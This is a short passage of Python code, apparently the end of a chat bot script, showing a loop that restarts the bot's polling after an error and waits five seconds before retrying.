            asyncio.run(bot.infinity_polling(timeout=60))
        except Exception as e:
            print(f"[-] Error: {e}")
            time.sleep(5)
